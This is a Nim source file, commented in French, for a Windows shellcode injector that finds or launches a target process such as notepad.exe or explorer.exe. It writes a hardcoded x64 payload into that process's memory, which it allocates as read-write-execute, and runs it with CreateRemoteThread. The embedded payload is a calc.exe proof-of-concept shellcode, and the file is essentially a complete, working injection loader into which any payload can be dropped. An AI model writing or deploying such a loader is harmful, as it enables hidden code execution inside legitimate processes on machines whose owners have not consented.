import winim/lean
import winim/inc/tlhelp32
import strformat
import strutils
import os

proc findProcessByName(processName: string): DWORD =
  ## Cherche un processus par son nom et retourne son PID
  var entry: PROCESSENTRY32
  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  
  let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if hSnapshot == INVALID_HANDLE_VALUE:
    echo "Erreur: Impossible de créer un snapshot des processus"
    return 0
  
  defer: CloseHandle(hSnapshot)
  
  if Process32First(hSnapshot, addr entry):
    while true:
      let procName = $cast[cstring](addr entry.szExeFile[0])
      if procName.toLower() == processName.toLower():
        echo fmt"Processus trouvé: {procName} (PID: {entry.th32ProcessID})"
        return entry.th32ProcessID
      
      if not Process32Next(hSnapshot, addr entry):
        break
  
  echo fmt"Processus '{processName}' non trouvé"
  return 0

proc createProcessSuspended(exePath: string): DWORD =
  ## Crée un processus suspendu et retourne son PID
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  
  si.cb = cast[DWORD](sizeof(STARTUPINFOA))
  
  let success = CreateProcessA(
    NULL,
    cast[LPSTR](exePath.cstring),
    NULL,
    NULL,
    FALSE,
    CREATE_SUSPENDED,
    NULL,
    NULL,
    addr si,
    addr pi
  )
  
  if success == 0:
    echo fmt"Erreur: Impossible de créer le processus '{exePath}'"
    return 0
  
  echo fmt"Processus créé et suspendu (PID: {pi.dwProcessId})"
  discard ResumeThread(pi.hThread)
  CloseHandle(pi.hThread)
  
  return pi.dwProcessId

proc injectShellcode(targetPid: DWORD, shellcode: openArray[byte]): bool =
  ## Injecte le shellcode dans le processus cible
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid)
  if pHandle == 0:
    echo fmt"Erreur: Impossible d'ouvrir le processus {targetPid}"
    return false
  
  defer: CloseHandle(pHandle)
  echo fmt"Handle obtenu sur le processus: {pHandle}"
  
  # Allouer mémoire dans le processus cible
  let remoteBuffer = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  if remoteBuffer == nil:
    echo "Erreur: Impossible d'allouer de la mémoire dans le processus cible"
    return false
  
  echo fmt"Mémoire allouée: 0x{cast[uint64](remoteBuffer):x}"
  
  # Écrire le shellcode en mémoire
  var bytesWritten: SIZE_T
  let writeSuccess = WriteProcessMemory(pHandle, remoteBuffer, unsafeAddr shellcode[0], cast[SIZE_T](shellcode.len), addr bytesWritten)
  
  if writeSuccess == 0:
    echo "Erreur: Impossible d'écrire le shellcode en mémoire"
    VirtualFreeEx(pHandle, remoteBuffer, 0, MEM_RELEASE)
    return false
  
  echo fmt"Shellcode écrit: {bytesWritten} bytes"
  
  # Créer un thread distant pour exécuter le shellcode
  let remoteThread = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](remoteBuffer), NULL, 0, NULL)
  if remoteThread == 0:
    echo "Erreur: Impossible de créer un thread distant"
    VirtualFreeEx(pHandle, remoteBuffer, 0, MEM_RELEASE)
    return false
  
  defer: CloseHandle(remoteThread)
  echo fmt"Thread créé et shellcode en exécution"
  
  # Attendre l'exécution
  discard WaitForSingleObject(remoteThread, INFINITE)
  echo "Injection complétée avec succès!"
  
  return true

proc main() =
  let args = commandLineParams()
  
  if args.len == 0:
    echo "Usage: injector.exe <processName> [binaryPath]"
    echo "Exemple: injector.exe notepad.exe"
    echo "Exemple: injector.exe explorer.exe C:\\Windows\\explorer.exe"
    return
  
  let targetName = args[0]
  var targetPid: DWORD = 0
  
  # Chercher le processus
  echo fmt"Recherche du processus: {targetName}"
  targetPid = findProcessByName(targetName)
  
  # Si non trouvé, créer le processus
  if targetPid == 0:
    echo fmt"Le processus n'existe pas, création en cours..."
    
    let binaryPath = if args.len > 1: args[1] else: targetName
    
    targetPid = createProcessSuspended(binaryPath)
    if targetPid == 0:
      echo "Erreur: Impossible de créer ou trouver le processus"
      return
  
  # Shellcode d'exemple (calc.exe)
  let shellcode: array[296, byte] = [
    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
    0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
    0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
    0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
    0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
    0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
    0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
    0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
    0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
    0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
    0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
    0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
    0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
    0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
    0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,
    0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
    0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
    0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,0x77,0x69,0x6e,0x64,0x6f,
    0x77,0x73,0x5c,0x73,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,
    0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]
  
  # Injecter le shellcode
  echo fmt"\n--- Injection dans le processus {targetName} (PID: {targetPid}) ---"
  let success = injectShellcode(targetPid, shellcode)
  
  if success:
    echo "\n✓ Injection réussie!"
  else:
    echo "\n✗ Injection échouée!"

main()